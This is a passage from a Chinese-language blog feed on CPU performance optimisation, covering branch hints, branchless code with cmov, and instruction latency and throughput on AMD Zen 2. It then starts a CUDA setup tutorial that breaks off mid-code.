8.3 cycles/element</strong></li>
</ul>
<p><strong>提升了约 1 cycle 的效率</strong>。</p>
<p><code>[[likely]]</code> 并不会直接影响 CPU
的分支预测器，而是改变了汇编代码的布局，使 CPU
前端（Front-End）更容易处理常见分支。也就是使<strong>更可能执行的分支紧跟主代码路径</strong>（减少
<code>jmp</code> 跳转的开销）。</p>
<p>在 C++20 之前，也可以使用 <code>__builtin_expect</code>（GCC &amp;
Clang 支持）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LIKELY(x) __builtin_expect(!!(x), 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNLIKELY(x) __builtin_expect(!!(x), 0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (LIKELY(a[i] &lt; P))</span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<h4 id="少分支编程">少分支编程</h4>
<p>既然进行分支预测可能会导致整个流水线清空重载，那么我们很容易想尝试能不能不用或少用分支实现同样的功能。</p>
<p>比如还是上述例子：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    a[i] = rand() % <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt; <span class="number">50</span>)</span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>可以用如下方法进行优化，去除掉if语句。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    s += (a[i] &lt; <span class="number">50</span>) * a[i];</span><br></pre></td></tr></table></figure></div></p>
<p>汇编中没有布尔类型，也没有直接建立正负值到0，1的映射。但是我们可以通过位操作技巧来实现这个功能，也就是右移位31位（因为int类型占32位）。这样由于负数的补码表示中最高位为1，所以可以用来建立一个正负值到0，1的映射。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; x = a[i]</span><br><span class="line">mov  ebx, eax   ; t = x</span><br><span class="line">sub  ebx, 50    ; t -= 50</span><br><span class="line">sar  ebx, 31    ; t &gt;&gt;= 31</span><br><span class="line">imul  eax, ebx   ; x *= t</span><br><span class="line">add dword ptr [rsp + 12], eax	; s+=x</span><br></pre></td></tr></table></figure></div>
<p>由于imul需要花费3个cycle，于是有种花费2个cycle实现的方式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov  ebx, eax   ; t = x</span><br><span class="line">sub  ebx, 50    ; t -= 50</span><br><span class="line">sar  ebx, 31    ; t &gt;&gt;= 31</span><br><span class="line">; imul  eax, ebx ; x *= t</span><br><span class="line">sub  ebx, 1     ; t -= 1 (causing underflow if t = 0)</span><br><span class="line">and  eax, ebx   ; x &amp;= t</span><br><span class="line">add dword ptr [rsp + 12], eax	; s+=x</span><br></pre></td></tr></table></figure></div>
<p>但上述两种优化方式没有考虑下溢出的情况，也就是<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.65ex" height="2.565ex" role="img" focusable="false" viewBox="0 -883.9 7359.3 1133.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mo" transform="translate(278,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(1056,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(2346.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(2790.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(3568.8,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(5081.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(6081.3,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(7081.3,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span>
这个范围内的值减50后会溢出，从而导致进入错误的分支。</p>
<p>所以现代 CPU 提供了一种<strong>条件移动（Conditional Move,
<code>cmov</code>）</strong>指令，能<strong>避免乘法和位运算</strong>，提高效率：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     ebx, 0      ; cmov 不能直接使用立即数，所以先设定 ebx=0</span><br><span class="line">cmp     eax, 50</span><br><span class="line">cmovge  eax, ebx    ; 若 eax &gt;= 50，则 eax = ebx (0)</span><br></pre></td></tr></table></figure></div>
<p>这相当于：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">s += (a[i] &lt; <span class="number">50</span> ? a[i] : <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
<p>最终编译器优化的汇编代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, -4000000</span><br><span class="line">loop:</span><br><span class="line">    mov     esi, dword ptr [rdx + a + 4000000]  ; 读取 a[i]</span><br><span class="line">    cmp     esi, 50</span><br><span class="line">    cmovge  esi, eax                            ; esi = (esi &gt;= 50 ? 0 : esi)</span><br><span class="line">    add     dword ptr [rsp + 12], esi           ; s += esi</span><br><span class="line">    add     rdx, 4</span><br><span class="line">    jnz     loop                                ; 继续循环</span><br></pre></td></tr></table></figure></div>
<h4 id="决定何时用分支">决定何时用分支</h4>
<p>由于cmov的方式实际上还是会让流水线产生暂停，这里我们可以对比一下两种不同方式在不同P值情况下的效率。可以看出当有75%把握确定选取某个分支时，分支预测的效率实际是会优于无分支方式的。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/branchy-vs-branchless.svg" class="">
<h4 id="应用示例">应用示例</h4>
<h5 id="字符串处理"><strong>字符串处理</strong></h5>
<p>在简化的情况下，<code>std::string</code> 实际上是由指向一个以 null
结尾的字符数组（也就是 C
字符串）的指针，以及一个存储字符串大小的整数组成的。一个常见的字符串值是空字符串，它的默认值也是空字符串。</p>
<p>处理空字符串的传统方式是，将字符串的指针赋为
<code>nullptr</code>，并将字符串大小赋为
0。在处理字符串时，我们需要检查指针是否为空或者大小是否为零。这样就会引入一个分支（<code>if</code>
检查），这种分支会带来性能开销（尤其是在大多数字符串为空或非空的情况下）。</p>
<p>为了去除这个分支，我们可以为空字符串分配一个“零 C
字符串”，即分配一个包含零字节的内存，并将所有空字符串都指向这个零字节。这样，所有处理空字符串的操作都将读取这个无用的零字节，虽然这会增加一些操作，但仍然比一个分支预测错误的开销要小得多。</p>
<h5 id="二分查找"><strong>二分查找</strong></h5>
<p>标准的二分查找可以通过消除分支来实现，在处理小数组（适合缓存时）时，比使用分支的
<code>std::lower_bound</code> 快大约 4 倍。</p>
<p>以下是一个消除分支的二分查找实现：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">lower_bound</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">    <span class="type">int</span> *base = t, len = n;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">1</span>) {</span><br><span class="line">        <span class="type">int</span> half = len / <span class="number">2</span>;</span><br><span class="line">        base += (base[half - <span class="number">1</span>] &lt; x) * half;  <span class="comment">// 会被替换成 "cmov"</span></span><br><span class="line">        len -= half;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> *base;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>这个实现的复杂度略高，但它的一个缺点是它可能会进行更多的比较（比标准二分查找需要更多的比较），并且无法像传统二分查找那样进行未来内存读取的预测（这通常作为预取操作，因此在处理非常大的数组时会有所损失）。</p>
<p>总结来说，数据结构通过隐式或显式地填充数据，消除分支，使得其操作需要固定次数的迭代。更多复杂的示例可以参考相关资料。</p>
<h5 id="数据并行编程"><strong>数据并行编程</strong></h5>
<p>在 SIMD（单指令多数据）应用中，分支消除非常重要，因为 SIMD
本身不支持分支操作。</p>
<p>在我们之前的数组求和例子中，去除累加器的 <code>volatile</code>
类型修饰符后，编译器能够对循环进行向量化优化：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* volatile */</span> <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt; <span class="number">50</span>)</span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>向量化后的代码每个元素处理时间为 0.3
个周期，性能瓶颈主要来自内存访问。</p>
<p>编译器通常能够向量化任何没有分支或迭代之间没有依赖关系的循环。如果循环存在少量的复杂变体，例如包含只有一个
<code>if</code> 而没有 <code>else</code>
的简单循环，编译器也能进行向量化优化。但对于更复杂的循环，向量化则变得非常复杂，可能需要一些技术，例如掩码处理和寄存器内的重新排列。</p>
<h4 id="指令表">指令表</h4>
<p>在数字电子学中，交错执行（Interleaving execution
stages）是一种常见的优化方式，它不仅应用于 CPU
的主流水线（pipeline），还用于单个指令的执行单元以及内存操作。大多数<strong>执行单元</strong>都有自己的小型流水线，并且通常可以在前一条指令执行一两周期后，就接受另一条指令。</p>
<p>在现代 CPU 体系结构中，<strong>执行单元</strong>（Execution
Units）是处理特定类型指令的硬件模块。不同的指令类别通常由专门的执行单元处理。例如：</p>
<ul>
<li><strong>整数运算单元（ALU, Arithmetic Logic
Unit）</strong>：用于执行
<code>add</code>、<code>sub</code>、<code>cmp</code> 等整数运算。</li>
<li><strong>浮点运算单元（FPU, Floating Point Unit）</strong>：用于执行
<code>mulss</code>、<code>divss</code> 等浮点数运算。</li>
<li><strong>加载/存储单元（Load/Store Unit, LSU）</strong>：用于
<code>mov r, m</code>、<code>mov m, r</code> 等内存访问指令。</li>
<li><strong>分支单元（Branch Unit）</strong>：用于
<code>jmp</code>、<code>call</code>、<code>ret</code>
等控制流指令。</li>
</ul>
<p>这些执行单元通常也是流水线化的（Pipelined），并且现代 CPU
可能会有<strong>多个相同类型的执行单元</strong>，以提高吞吐量。可以把
CPU 的流水线看作是<strong>多个层级的流水线结构</strong>。</p>
<p>以下是一些常见的 CPU 资源分配：</p>
<table>
<colgroup>
<col style="width: 20%">
<col style="width: 80%">
</colgroup>
<thead>
<tr>
<th><strong>流水线阶段</strong></th>
<th><strong>可能涉及的硬件单元</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>取指（IF）</strong></td>
<td>指令缓存（L1I Cache）、<strong>IFU</strong>取指单元</td>
</tr>
<tr>
<td><strong>解码（ID）</strong></td>
<td>指令解码单元、寄存器重命名单元</td>
</tr>
<tr>
<td><strong>执行（EX）</strong></td>
<td><strong>ALU</strong>（整数运算）、<strong>FPU</strong>（浮点运算）、<strong>SIMD</strong>（矢量指令）、<strong>AGU</strong>（地址计算单元）</td>
</tr>
<tr>
<td><strong>访存（MEM）</strong></td>
<td><strong>LSU</strong>（加载/存储单元）、L1/L2 Cache</td>
</tr>
<tr>
<td><strong>写回（WB）</strong></td>
<td>寄存器文件、提交队列</td>
</tr>
</tbody>
</table>
<p>所以在这种情况下，有两种不同衡量指令花费的标准，一种是延迟（<em>Latency</em>），另一种是吞吐量（<em>Throughput</em>）。</p>
<ul>
<li><p><strong>延迟（Latency）</strong>：指令的执行结果需要多少个周期（cycles）才能获得。</p></li>
<li><p><strong>吞吐量（Throughput）</strong>：平均每个周期可以执行多少条该指令。</p></li>
</ul>
<p>对于特定的 CPU 架构，我们可以通过<strong>指令表（Instruction
Tables）</strong>来获取这些数值。以下是 <strong>AMD Zen 2</strong>
架构上一些指令的示例（所有操作数均为 32 位）：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>延迟（Latency）</th>
<th>反向吞吐量（Reciprocal Throughput）</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>jmp</code></td>
<td>-</td>
<td>2</td>
</tr>
<tr>
<td><code>mov r, r</code></td>
<td>-</td>
<td>1/4</td>
</tr>
<tr>
<td><code>mov r, m</code></td>
<td>4</td>
<td>1/2</td>
</tr>
<tr>
<td><code>mov m, r</code></td>
<td>3</td>
<td>1</td>
</tr>
<tr>
<td><code>add</code></td>
<td>1</td>
<td>1/3</td>
</tr>
<tr>
<td><code>cmp</code></td>
<td>1</td>
<td>1/4</td>
</tr>
<tr>
<td><code>popcnt</code></td>
<td>1</td>
<td>1/4</td>
</tr>
<tr>
<td><code>mul</code></td>
<td>3</td>
<td>1</td>
</tr>
<tr>
<td><code>div</code></td>
<td>13-28</td>
<td>13-28</td>
</tr>
</tbody>
</table>
<p><strong>吞吐量的倒数（Reciprocal Throughput）</strong></p>
<ul>
<li>因为人们通常习惯于<strong>“数值越大代表开销越大”</strong>的成本模型，所以更常用<strong>反向吞吐量</strong>（Reciprocal
Throughput），即每条指令平均需要多少个周期才能执行完一条（而不是每周期执行多少条）。</li>
</ul>
<p><strong>指令执行单元的复用</strong></p>
<ul>
<li>如果某条指令非常频繁，CPU
可能会复制其执行单元，以提高吞吐量（但通常不会超过解码宽度）。</li>
<li>例如，<code>add</code> 具有 1/3 的吞吐量，这表示多个
<code>add</code> 指令可以在不同的执行单元中同时进行。</li>
</ul>
<p><strong>流水线执行</strong></p>
<ul>
<li>许多指令都是<strong>流水线化（Pipelined）</strong>的。例如，<strong>如果某条指令的吞吐量倒数是
<code>n</code>，通常意味着它的执行单元可以在 <code>n</code>
个周期后接受另一条同样的指令</strong>。</li>
<li>如果吞吐量倒数小于 1（如 <code>mov r, r</code> 的 1/4），表示 CPU
可能有多个执行单元，可以在同一周期并行执行多条这样的指令。</li>
</ul>
<p><strong>变量延迟（Variable Latency）</strong></p>
<ul>
<li><strong>某些指令的延迟会根据操作数的值和大小而变化</strong>。</li>
<li><strong>内存访问指令（如
<code>mov r, m</code>）的延迟通常按最优情况（L1
缓存命中）计算</strong>。如果数据来自 L2
或者更慢的内存层级，延迟会显著增加。</li>
</ul>
<p>优化延迟通常和优化吞吐量有很大的不同，</p>
<p>假设有一个数组求和的代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>如果我们假设：</p>
<ul>
<li><strong>编译器没有向量化</strong>（SIMD 没有被使用）。</li>
<li><strong>访存不是瓶颈</strong>（假设数据已在 L1 缓存中）。</li>
<li><strong>循环已展开</strong>（即手动展开循环，消除循环变量维护的额外开销）。</li>
</ul>
<p>那么，它会被展开成：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">s += a[<span class="number">0</span>];</span><br><span class="line">s += a[<span class="number">1</span>];</span><br><span class="line">s += a[<span class="number">2</span>];</span><br><span class="line">s += a[<span class="number">3</span>];</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>
<p>由于 <code>add</code> 指令的<strong>延迟为 1</strong>，每次
<code>s += a[i]</code> 操作都依赖于前一次计算的
<code>s</code>，<strong>导致只能每个周期执行 1 次
<code>add</code></strong>，即 <strong>处理 1
个数组元素/周期</strong>。</p>
<p>然而，我们注意到 <strong>Zen 2 处理器的 <code>add</code> 吞吐量是
2</strong>，也就是说 <strong>CPU 实际上每个周期可以执行 2 次
<code>add</code></strong>，但当前代码无法利用这个能力，因为每个
<code>add</code> 依赖于上一次的
<code>s</code>，存在<strong>数据依赖</strong>。这里说add的吞吐量为2，好像与上面表中说明吞吐量为3相悖，实际是因为<strong>寄存器到寄存器的
<code>add</code> 指令吞吐量很高（4），但如果 <code>add</code>
的操作数之一来自内存，它的执行速度就会受到内存读取的吞吐量限制（2）</strong>。</p>
<p>假设 CPU 里有 <strong>4 条 ALU 管道</strong> 专门用于
<code>add</code> 操作，而有 <strong>2 条 Load/Store 单元（LSU）</strong>
用于 <code>mov</code>（内存加载）。</p>
<ul>
<li><strong>如果 <code>add</code> 只用
ALU（<code>reg, reg</code>），它可以 4 条并行执行</strong>。</li>
<li><strong>如果 <code>add</code>
需要访问内存（<code>reg, [mem]</code>），它必须先经过 LSU
加载数据</strong>，但 <strong>LSU 只有 2 条管道，所以吞吐量上限是
2</strong>。</li>
</ul>
<p>你可以把 <code>add reg, reg</code> 想象成 <strong>一条 4
车道的高速公路</strong>，而 <code>add reg, [mem]</code> 受限于 <strong>2
车道的收费站</strong>，所以即使后面有 4 车道，整体吞吐量还是受限于 2
车道的瓶颈。</p>
<p><strong>解决方案：使用多个累加器</strong></p>
<p>为了提高吞吐量，我们可以使用<strong>两个独立的累加器</strong>，分别求和奇数索引和偶数索引的元素：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> s0 = <span class="number">0</span>, s1 = <span class="number">0</span>;</span><br><span class="line">s0 += a[<span class="number">0</span>];</span><br><span class="line">s1 += a[<span class="number">1</span>];</span><br><span class="line">s0 += a[<span class="number">2</span>];</span><br><span class="line">s1 += a[<span class="number">3</span>];</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">int</span> s = s0 + s1;</span><br></pre></td></tr></table></figure></div>
<p><strong>这样做的好处是：</strong></p>
<ul>
<li><strong>s0 和 s1
互不依赖</strong>，可以<strong>并行执行</strong>。</li>
<li>由于 <code>add</code> 吞吐量是 <strong>2</strong>，CPU
<strong>每个周期可以执行 2 条 <code>add</code>
指令</strong>，所以<strong>数组求和的吞吐量提高了一倍</strong>。</li>
<li>计算完成后，我们再执行 <code>s0 + s1</code>，这只是一次额外的
<code>add</code>，不会显著影响性能。</li>
</ul>
<p><strong>一般情况：多累加器策略</strong></p>
<p>如果某条指令：</p>
<ul>
<li><strong>延迟（Latency）= x</strong></li>
<li><strong>吞吐量（Throughput）= y</strong></li>
</ul>
<p>那么，要<strong>完全利用 CPU 的执行单元</strong>，我们需要 <strong>x
× y 个独立的累加器</strong>，以确保 CPU
在任何时刻都有足够的指令可以执行，不会被数据依赖阻塞。</p>
<p>对于 <code>add</code>：</p>
<ul>
<li><strong>Latency = 1</strong></li>
<li><strong>Throughput = 2</strong></li>
</ul>
<p>因此，我们需要<strong>1 × 2 = 2 个累加器</strong>（s0 和
s1），刚好匹配 CPU 资源，最大化吞吐量。</p>
<p>在优化循环时，我们通常：</p>
<ol type="1">
<li><strong>确定 CPU 关键的执行端口</strong>（Execution Ports）——
不同指令可能使用不同的执行端口。</li>
<li><strong>分析循环中各个指令的吞吐量</strong>，找出最可能成为瓶颈的指令。</li>
<li><strong>使用机器代码分析工具</strong>（如 LLVM's
<code>llvm-mca</code>、Intel
VTune、uops.info）来查看<strong>哪条指令最占用资源</strong>，然后针对性优化。</li>
</ol>
]]></content>
      <categories>
        <category>HPC</category>
      </categories>
      <tags>
        <tag>HPC</tag>
        <tag>optimization</tag>
      </tags>
  </entry>
  <entry>
    <title>CUDA编程模型初探</title>
    <url>/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h2 id="cuda编程模型初探">CUDA编程模型初探</h2>
<h4 id="安装">安装</h4>
<p>可以在官网选择下载适合自己版本的<a class="link" 
 href="https://developer.nvidia.com/rdp/cudnn-archive" >cuDNN<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>然后下载<a class="link" 
 href="https://developer.nvidia.com/cuda-toolkit-archive" >CUDA<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，根据安装程序的提示配置即可。</p>
<p>之后安装完成后可以把安装好的CUDA根目录下的bin目录设置为环境变量，然后用<strong>nvcc</strong>测试一下是否设置成功。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250318180539128.png"
                      class=""
                >
<p>然后把之前下好的<strong>cuDNN</strong>中的lib、bin、include目录下的所有文件都拷贝到我们<strong>CUDA</strong>对应的目录。</p>
<p>然后我们打开VS2022就能创建一个CUDA项目了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250318195408801.png"
                      class=""
                >
<p>如果项目模板文件存在问题，我们可以手动对环境进行配置。<strong>右键项目→属性→
配置属性→
VC++目录</strong>，进去把包含目录指向我们下载的<strong>CUDA</strong>的<strong>include</strong>目录，把库目录指向我们下载的CUDA的<strong>lib/x64</strong>目录。正常而言这里不需要我们进行手动配置。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250318202338004.png"
                      class=""
                >
<p>然后我们可以用一下程序跑一下，来查看我们的GPU的一些基本情况。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cuda_runtime.h&gt;</span>  <span class="comment">// CUDA 运行时 API</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHECK(call) &#123; \</span></span><br><span class="line"><span class="meta">    cudaError_t err = call; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (err != cudaSuccess) &#123; \</span></span><br><span class="line"><span class="meta">        std::cerr &lt;&lt; <span class="string">&quot;CUDA error in &quot;</span> &lt;&lt; __FILE__ &lt;&lt; <span class="string">&quot; at line &quot;</span> &lt;&lt; __LINE__ &lt;&lt; <span class="string">&quot;: &quot;</span> \</span></span><br><span class="line"><span class="meta">                  &lt;&lt; cudaGetErrorString(err) &lt;&lt; std::endl; \</span></span><br><span class="line"><span class="meta">        exit(EXIT_FAILURE); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> dev = <span class="number">0</span>;  <span class="comment">// 选择 GPU 设备 0</span></span><br><span class="line">    cudaDeviceProp devProp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CHECK</span>(<span class="built_in">cudaGetDeviceProperties</span>(&amp;devProp, dev));</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;使用 GPU device &quot;</span> &lt;&lt; dev &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; devProp.name &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;SM 的数量：&quot;</span> &lt;&lt; devProp.multiProcessorCount &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;每个线程块的共享内存大小：&quot;</span> &lt;&lt; devProp.sharedMemPerBlock / <span class="number">1024.0</span> 